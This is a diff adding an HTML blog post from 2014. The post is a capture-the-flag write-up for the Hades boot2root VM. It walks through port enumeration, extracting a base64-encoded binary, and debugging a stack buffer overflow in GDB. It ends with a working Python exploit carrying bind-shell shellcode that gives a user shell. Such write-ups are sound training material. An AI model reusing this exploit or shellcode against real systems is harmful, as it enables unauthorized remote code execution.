@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>The Infernal: Hades - Part 1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-06-05">June 05, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/hades">hades</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">The Infernal: Hades - Part 1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>Hades is a new boot2root challenge pitched at the advanced hobbyist.  Solving this challenge will require skills in reverse engineering, exploit development and understanding of computer architecture.  The aim of this challenge is to incrementally increase access to the box until you can escalate to root.  The /root/flag.txt file is the final goal.</p>
+
+<p>Let&rsquo;s mosey&hellip;</p>
+
+<h2 id="enumeration:cb235dd34a9cd98c7241a4f538aa5bc4">Enumeration</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sV -A -p- 192.168.127.132
+  
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 e1:47:74:6c:b5:9c:8b:76:fd:92:77:91:fa:e7:f4:ee (DSA)
+|   2048 9c:a0:0b:f3:63:2e:8e:10:77:e9:a3:5a:dd:f1:6d:46 (RSA)
+|_  256 0b:8d:d1:bf:6e:b8:cf:99:38:64:f0:58:bb:3c:45:77 (ECDSA)
+65535/tcp open  unknown
+1 service unrecognized despite returning data.
+[...snip...]
+&quot;Welcome\x20to\x20t
+SF:he\x20jungle\.\x20\x20\nEnter\x20up\x20to\x20two\x20commands\x20of\x20l
+SF:ess\x20than\x20121\x20characters\x20each\.\n\0Got\x20it\n&quot;
+[...snip...]
+</code></pre>
+
+<p>Just from reading the Nmap output, it seems the service on 65535 prompts for some input and was accepting Nmap probes, but not outputting anything useful.  I tried connecting to the port with <code>netcat</code>, but it was unable to connect.</p>
+
+<pre><code class="language-text">root@kali:~# nc 192.168.127.132 65535
+nc: unable to connect to address 192.168.127.132, service 65535
+</code></pre>
+
+<p>I tried verifying the port was open with Nmap, but it was reported as being closed.</p>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sS 192.168.127.132 -p 65535
+PORT      STATE  SERVICE
+65535/tcp closed unknown
+</code></pre>
+
+<p>I put <code>Nmap</code> on a loop, to keep checking whether the port automatically came back up.  I lost patience after a few minutes, so just rebooted the VM.  Good start :D.  At this point I assumed one of the Nmap probes somehow crashed the application.</p>
+
+<p>When it came back up, I had a bit of a play.</p>
+
+<pre><code class="language-text">root@kali:~# nc 192.168.127.132 65535
+Welcome to the jungle.  
+Enter up to two commands of less than 121 characters each.
+</code></pre>
+
+<p>Every input I entered returned a <em>&ldquo;Got it&rdquo;</em> message and after two commands are entered, the application stops responding and I had to re-connected.  The app does express there&rsquo;s a character limit for the commands of &lt;121 each, so I sent one large string of 242 A&rsquo;s.</p>
+
+<pre><code class="language-text">root@kali:~# python -c 'print (&quot;A&quot; * 242)' | nc 192.168.127.132 65535
+Welcome to the jungle.  
+Enter up to two commands of less than 121 characters each.
+Got it
+Got it
+
+root@kali:~# nc 192.168.127.132 65535
+nc: unable to connect to address 192.168.127.132, service 65535
+</code></pre>
+
+<p>So that crashed the application, but I currently had no way to analyise or debug what was happening.</p>
+
+<p>With this a dead-end, for now, I turned my attention to the SSH service.  I attempted an SSH connection to Hades and was surprised to see a mass of output.</p>
+
+<pre><code class="language-text">root@kali:~# ssh 192.168.127.132
+f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIUECDQAAABUDgAAAAAAADQAIAAIACgAHwAcAAYAAAA0
+[...snip...]
+aXN0ZXJDbGFzc2VzAHNvY2tldEBAR0xJQkNfMi4wAF9fVE1DX0VORF9fAF9JVE1fcmVnaXN0ZXJU
+TUNsb25lVGFibGUAX2luaXQAdjAAdjIA
+root@192.168.127.132's password:
+</code></pre>
+
+<p>This looked like it was encoded somehow to me.  I copied the text into Burpsuite&rsquo;s Decoder function and tried various decoding methods.  I eventually reached base64 and I could suddenly see some plaintext strings.  Including binary functions (socket, strcpy, _start_main etc).</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/hades/base64.png"  />
+    
+    
+</figure>
+</div>
+
+<p>I converted the file into an executable binary, and ran it on my Kali VM.</p>
+
+<pre><code class="language-text">root@kali:~/hades# base64 -d file &gt; binary
+
+root@kali:~/hades# file binary 
+binary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xc0bc41d21254d7f04d83fec32b7345d3505c0759, not stripped
+
+root@kali:~/hades# ./binary
+  
+root@kali:~/hades# netstat -antp
+tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      4402/binary     
+  
+root@kali:~/hades# nc localhost 65535
+Welcome to the jungle.  
+Enter up to two commands of less than 121 characters each.
+</code></pre>
+
+<p>So it looks as though I have a copy of the app running on Hades - time to exploit it!</p>
+
+<h2 id="burn-baby-burn:cb235dd34a9cd98c7241a4f538aa5bc4">Burn Baby Burn</h2>
+
+<pre><code class="language-text">root@kali:~/hades# checksec --file binary 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   binary
+</code></pre>
+
+<p>There appears to be minimal protection on the binary itself - hopefully this will be a strightforward exercise :D &hellip;yeah, right.  I loaded it up in GDB and crashed it with a string of A&rsquo;s.  It looks like I control <code>EBP</code> and <code>EIP</code>.</p>
+
+<pre><code class="language-text">Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+  
+(gdb) i r
+eax            0x5     5
+ecx            0xb7fbf4e0     -1208224544
+edx            0xb7fc0360     -1208220832
+ebx            0xb7fbeff4     -1208225804
+esp            0xbffff350     0xbffff350
+ebp            0x41414141     0x41414141
+esi            0x0     0
+edi            0x0     0
+eip            0x41414141     0x41414141
+</code></pre>
+
+<p>Using the pattern offset method, I determined that <code>EIP</code> was overwritten after <code>171 bytes</code> and <code>EBP</code> at <code>167</code>.  I threw some more data at the binary to see what else could be overwritten.</p>
+
+<p><code>root@kali:~/hades# python -c 'print (&quot;A&quot; * 163) + (&quot;B&quot; * 4) + (&quot;C&quot; * 4) + (&quot;D&quot; * 50)' | nc localhost 65535</code></p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/hades/eip.png"  />
+    
+    
+</figure>
+</div>
+
+<p>The above stack shows that <code>EIP</code> (red) and <code>EDB</code> (green) have been overwritten and that the buffer of A&rsquo;s has been split, the majority highlighted in yellow.  It looks like the large group of A&rsquo;s is about <code>112 bytes</code> in total, plenty of room for some shellcode if I can get there.  There are about <code>28 bytes</code> which I need to remove from <code>ESP</code>, so that it can point directly at my buffer.</p>
+
+<p>I started looking for instructions in the binary which I could use to manipulate <code>ESP</code>, and came across this add <code>ESP</code> instruction.</p>
+
+<p><code>8048a32:   83 c4 1c                add    esp,0x1c</code></p>
+
+<p>This will add <code>28</code> (1C) bytes to <code>ESP</code>, as desired.  But I need to know what other instructions come after this.</p>
+
+<pre><code class="language-text">8048a32:       83 c4 1c                add    esp,0x1c
+8048a35:       5b                      pop    ebx
+8048a36:       5e                      pop    esi
+8048a37:       5f                      pop    edi
+8048a38:       5d                      pop    ebp
+8048a39:       c3                      ret    
+</code></pre>
+
+<p>I also found a <code>JMP ESP</code> instruction.</p>
+
+<p><code>8048697:    ff e4                   jmp    esp</code></p>
+
+<p>So, this looks pretty good - after the add <code>ESP</code> instruction, a bunch of the registers are pop&rsquo;d followed by a return.</p>
+
+<p>I followed this through in GDB by setting up a hook, and placing a break point on <code>0x8048a32</code>.</p>
+
+<pre><code class="language-text">(gdb) define hook-stop
+Type commands for definition of &quot;hook-stop&quot;.
+End with a line saying just &quot;end&quot;.
+&gt;disassemble
+&gt;x/10x $esp
+&gt;i r
+&gt;end
+</code></pre>
+
+<p><code>root@kali:~/hades# python -c 'print (&quot;A&quot; * 171) + &quot;\x32\x8a\x04\x08&quot;' | nc localhost 65535</code></p>
+
+<p>The breakpoint is reached, which means the jump was successful.  The advantage of the hook, is that I can now do <code>stepi</code> to execute the next instruction and GDB will automatically print out the instructions in the hook (saving me a lot of time and typing :)).  It allows me to see the state of the stack and registers easily after each instruction.</p>
+
+<p>Just before the return is executed, this is how things look:</p>
+
+<pre><code class="language-text">   0x08048a32 &lt;+82&gt;:  add    esp,0x1c
+   0x08048a35 &lt;+85&gt;:  pop    ebx
+   0x08048a36 &lt;+86&gt;:  pop    esi
+   0x08048a37 &lt;+87&gt;:  pop    edi
+   0x08048a38 &lt;+88&gt;:  pop    ebp
+=&gt; 0x08048a39 &lt;+89&gt;:   ret    
+End of assembler dump.
+0xbffff38c: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff39c: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff3ac: 0x41414141  0x41414141
+eax            0x5  5
+ecx            0xb7fbf4e0   -1208224544
+edx            0xb7fc0360   -1208220832
+ebx            0x41414141   1094795585
+esp            0xbffff38c   0xbffff38c
+ebp            0x41414141   0x41414141
+esi            0x41414141   1094795585
+edi            0x41414141   1094795585
+eip            0x8048a39    0x8048a39 &lt;__libc_csu_init+89&gt;
+</code></pre>
+
+<p><code>EIP</code> is currently pointing to <code>0x8048a39</code>, so when I execute the return it should result in a crash (since <code>0x41414141</code> is just bollocks).</p>
+
+<pre><code class="language-text">No function contains program counter for selected frame.
+0x41414141 in ?? ()
+</code></pre>
+
+<p>A little more analysis shows that when the ret is evenually executed, I return <code>17 bytes</code> inside the original buffer.  I now started to flesh out an exploit in python, aptly dubbed <code>zeus.py</code>.</p>
+
+<p>I needed some shellcode to execute, but in such a small space the usual Metasploit generated stuff was going to be too big.  I have the <code>shell-storm</code> Python API installed, so was able to find some small (<code>73 bytes</code>) bind shellcode fairly easily.</p>
+
+<p>The structure of the exploit will go: <em>[JUNK][JMP ESP][SHELLCODE][PADDING][ADD ESP&hellip;RET]</em></p>
+
+<p><code>EIP</code> will be overridden by the address for add <code>ESP</code> and the pop&rsquo;s and ret instruction will follow, as demonstrated.  This will remove the <code>17 bytes</code> of junk from the beginning of the buffer.  When the <code>ret</code> instruction is followed, execution flow will land on <code>JMP ESP</code> and execute the shellcode.  My final exploit is as follows:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+  
+import socket
+  
+target = '192.168.127.132'
+port = 65535
+  
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  
+shellcode = (&quot;\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a&quot; # 73 bytes, bind on 11111
+&quot;\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68&quot;
+&quot;\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1&quot;
+&quot;\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd&quot;
+&quot;\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f&quot;
+&quot;\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f&quot;
+&quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3&quot;
+&quot;\x41\xcd\x80&quot;)
+  
+buffer = (&quot;\x90&quot; * 17)
+buffer += &quot;\x97\x86\x04\x08&quot; # jmp esp
+buffer += shellcode
+buffer += (&quot;\x90&quot; * 77) # junk padding
+buffer += &quot;\x32\x8a\x04\x08&quot; # add esp etc...
+  
+try:
+        s.connect((target, port))
+        s.recv(1024)
+        s.send(buffer)
+  
+except:
+        print &quot;Couldn't connect to Hades&quot;
+</code></pre>
+
+<p>Connect to the bind port with netcat and&hellip;</p>
+
+<pre><code class="language-text">id; whoami
+uid=1000(loki) gid=1000(loki) groups=1000(loki),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+loki
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
